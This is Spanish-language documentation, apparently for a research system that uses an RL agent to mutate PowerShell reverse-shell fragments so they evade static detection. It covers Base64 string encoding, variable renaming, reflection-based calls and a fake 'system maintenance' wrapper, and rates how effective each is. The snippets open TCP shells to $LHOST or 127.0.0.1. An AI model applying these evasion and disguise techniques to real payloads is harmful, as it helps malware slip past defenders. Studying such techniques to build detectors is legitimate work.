# Documentación de Técnicas de Mutación

Este documento describe en detalle las técnicas de mutación implementadas en el sistema de evolución adversarial.

## Índice

1. [Encode All Strings Base64](#1-encode-all-strings-base64)
2. [Split Commands Aggressive](#2-split-commands-aggressive)
3. [Rename All Variables](#3-rename-all-variables)
4. [Add Multiple Benign Wrappers](#4-add-multiple-benign-wrappers)
5. [Change Entire Syntax](#5-change-entire-syntax)
6. [Insert Random Whitespace](#6-insert-random-whitespace)
7. [Obfuscate Network Calls](#7-obfuscate-network-calls)
8. [Use Reflection Methods](#8-use-reflection-methods)
9. [Add Fake Error Handling](#9-add-fake-error-handling)
10. [Modify Encoding Methods](#10-modify-encoding-methods)

---

## 1. Encode All Strings Base64

**Acción:** `encode_all_strings_base64`

**Descripción:** Codifica todos los strings literales del payload en Base64 y los decodifica en tiempo de ejecución usando métodos de .NET.

**Técnica:**
- Busca todos los strings entre comillas dobles (`"..."`)
- Codifica el contenido del string en Base64
- Reemplaza el string original con una llamada a `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("..."))`

**Ejemplo:**
```powershell
# Antes:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);

# Después:
$client = New-Object System.Net.Sockets.TCPClient([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTI3LjAuMC4x")), 9999);
```

**Efectividad:** Alta - Ofusca strings que pueden ser detectados por firmas estáticas.

**Limitaciones:** No codifica strings vacíos o muy cortos (< 2 caracteres).

---

## 2. Split Commands Aggressive

**Acción:** `split_commands_aggressive`

**Descripción:** Divide comandos que están en la misma línea separados por punto y coma, y divide líneas largas en múltiples líneas.

**Técnica:**
1. Divide comandos separados por `;` en líneas separadas
2. Para líneas largas (> 80 caracteres) que contienen `=`, divide la asignación en múltiples líneas con indentación

**Ejemplo:**
```powershell
# Antes:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999); $stream = $client.GetStream();

# Después:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999)
$stream = $client.GetStream()
```

**Efectividad:** Media - Cambia la estructura del código pero mantiene la funcionalidad.

**Limitaciones:** Puede no aplicar cambios si el payload ya está bien formateado.

---

## 3. Rename All Variables

**Acción:** `rename_all_variables`

**Descripción:** Renombra todas las variables de PowerShell usando un esquema de nombres basado en hash.

**Técnica:**
- Encuentra todas las variables que empiezan con `$`
- Genera un nuevo nombre usando el formato: `$var_{mutation_id}_{hash}`
- Preserva variables especiales: `$null`, `$true`, `$false`, `$_`

**Ejemplo:**
```powershell
# Antes:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
$stream = $client.GetStream();

# Después:
$var_test1_a1b2c3 = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
$var_test1_d4e5f6 = $var_test1_a1b2c3.GetStream();
```

**Efectividad:** Alta - Rompe firmas basadas en nombres de variables conocidos.

**Limitaciones:** No renombra variables especiales de PowerShell.

---

## 4. Add Multiple Benign Wrappers

**Acción:** `add_multiple_benign_wrappers`

**Descripción:** Envuelve el payload con código benigno que parece ser un script de mantenimiento del sistema.

**Técnica:**
- Añade un header con comentarios que simulan un script de mantenimiento
- Añade una función falsa `Start-SystemCheck` que usa WMI
- Añade un footer con limpieza de variables y garbage collection

**Ejemplo:**
```powershell
# Añade al inicio:
# =============================================================================
# SYSTEM MAINTENANCE SCRIPT - Build 5432
# Purpose: Automated system optimization and monitoring
# Generated: 2024-01-15 10:30:00
# =============================================================================

function Start-SystemCheck456 {
    try {
        $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
        $memory = Get-WmiObject -Class Win32_ComputerSystem
        Write-Debug "System check completed" -Debug
    } catch {
        # Silent error handling
    }
}

Start-SystemCheck456

# [PAYLOAD ORIGINAL AQUÍ]

# Añade al final:
# =============================================================================
# SCRIPT EXECUTION COMPLETED
# Cleanup temporary resources
# =============================================================================

Remove-Variable * -ErrorAction SilentlyContinue
[System.GC]::Collect()
```

**Efectividad:** Media - Puede confundir análisis estáticos, pero el payload real sigue siendo detectable.

**Limitaciones:** Añade código adicional que puede aumentar el tamaño del payload.

---

## 5. Change Entire Syntax

**Acción:** `change_entire_syntax`

**Descripción:** Reemplaza nombres de métodos y propiedades comunes con variantes que parecen ser nombres de clases o métodos personalizados.

**Técnica:**
- Reemplaza `New-Object` → `NewObject`
- Reemplaza `GetStream()` → `GetStreamMethod()`
- Reemplaza nombres de clases añadiendo sufijos como `Class` o `Property`

**Ejemplo:**
```powershell
# Antes:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
$stream = $client.GetStream();

# Después:
$client = NewObject System.Net.Sockets.TCPClientClass("127.0.0.1", 9999);
$stream = $client.GetStreamMethod();
```

**Efectividad:** Baja - Estos cambios pueden romper la funcionalidad del código si no se manejan correctamente.

**Limitaciones:** Puede hacer que el código no funcione si los reemplazos no son válidos en PowerShell.

---

## 6. Insert Random Whitespace

**Acción:** `insert_random_whitespace`

**Descripción:** Añade espacios en blanco aleatorios al inicio de las líneas y líneas vacías aleatorias.

**Técnica:**
- Añade entre 0-8 espacios al inicio de cada línea
- Añade líneas vacías aleatorias con probabilidad del 30%

**Ejemplo:**
```powershell
# Antes:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
$stream = $client.GetStream();

# Después:
    $client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);

      $stream = $client.GetStream();
```

**Efectividad:** Muy Baja - Solo cambia el formato, no la funcionalidad ni la detección.

**Limitaciones:** No afecta la detección por firmas estáticas.

---

## 7. Obfuscate Network Calls

**Acción:** `obfuscate_network_calls`

**Descripción:** Reemplaza la creación directa de objetos TCPClient con creación usando reflexión.

**Técnica:**
- Busca `New-Object Net.Sockets.TCPClient($LHOST, $LPORT)`
- Lo reemplaza con código que usa reflexión para obtener el constructor e invocarlo

**Ejemplo:**
```powershell
# Antes:
$client = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)

# Después:
$tcpType = [System.Net.Sockets.TCPClient]
$tcpConstructor = $tcpType.GetConstructor(@([string], [int]))
$TCPClient = $tcpConstructor.Invoke(@($LHOST, $LPORT))
```

**Efectividad:** Alta - Ofusca llamadas de red que son comúnmente detectadas.

**Limitaciones:** Solo funciona si el payload contiene el patrón exacto `New-Object Net.Sockets.TCPClient($LHOST, $LPORT)`.

---

## 8. Use Reflection Methods

**Acción:** `use_reflection_methods`

**Descripción:** Reemplaza llamadas directas a métodos con invocación usando reflexión.

**Técnica:**
- Reemplaza métodos comunes con llamadas usando `.GetType().GetMethod().Invoke()`
- Métodos objetivo: `GetStream()`, `Read()`, `Write()`, `Close()`

**Ejemplo:**
```powershell
# Antes:
$stream = $client.GetStream();
$bytes = $stream.Read($buffer, 0, $buffer.Length);

# Después:
$stream = $client.GetType().GetMethod("GetStream").Invoke($client, @());
$bytes = $stream.GetType().GetMethod("Read").Invoke($stream, @($buffer, 0, $buffer.Length));
```

**Efectividad:** Alta - Ofusca llamadas a métodos que pueden ser detectadas.

**Limitaciones:** Solo funciona si el payload contiene los métodos objetivo.

---

## 9. Add Fake Error Handling

**Acción:** `add_fake_error_handling`

**Descripción:** Añade bloques try-catch falsos alrededor de líneas de código aleatorias.

**Técnica:**
- Para cada línea de código (con probabilidad del 40%)
- Añade un bloque try-catch que ejecuta una operación benigna (Get-Date)

**Ejemplo:**
```powershell
# Antes:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
$stream = $client.GetStream();

# Después:
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
try {
    # Temporary operation
    $temp = Get-Date
} catch [System.Exception] {
    # Suppress all errors
}
$stream = $client.GetStream();
```

**Efectividad:** Baja - Añade ruido pero no ofusca significativamente el código malicioso.

**Limitaciones:** Puede hacer el código más largo sin mejorar la evasión.

---

## 10. Modify Encoding Methods

**Acción:** `modify_encoding_methods`

**Descripción:** Cambia métodos de encoding de UTF8 a codificación por número de página de código.

**Técnica:**
- Busca `([text.encoding]::UTF8).GetString`
- Lo reemplaza con `[System.Text.Encoding]::GetEncoding(65001).GetString`
- 65001 es el código de página para UTF-8

**Ejemplo:**
```powershell
# Antes:
$data = ([text.encoding]::UTF8).GetString($bytes)

# Después:
$data = [System.Text.Encoding]::GetEncoding(65001).GetString($bytes)
```

**Efectividad:** Media - Cambia la sintaxis pero mantiene la funcionalidad.

**Limitaciones:** Solo funciona si el payload contiene el patrón exacto.

---

## Estrategias de Combinación

El agente RL aprende qué combinaciones de mutaciones son más efectivas. Las mutaciones más efectivas suelen ser:

1. **Alta efectividad:** `encode_all_strings_base64`, `rename_all_variables`, `use_reflection_methods`, `obfuscate_network_calls`
2. **Media efectividad:** `split_commands_aggressive`, `add_multiple_benign_wrappers`, `modify_encoding_methods`
3. **Baja efectividad:** `change_entire_syntax`, `insert_random_whitespace`, `add_fake_error_handling`

## Notas de Implementación

- Todas las mutaciones incluyen un fallback que añade un comentario si la mutación no cambia el payload
- Las mutaciones se validan usando hash MD5 para asegurar que se aplicaron cambios
- El sistema registra qué mutaciones fueron exitosas para aprendizaje futuro

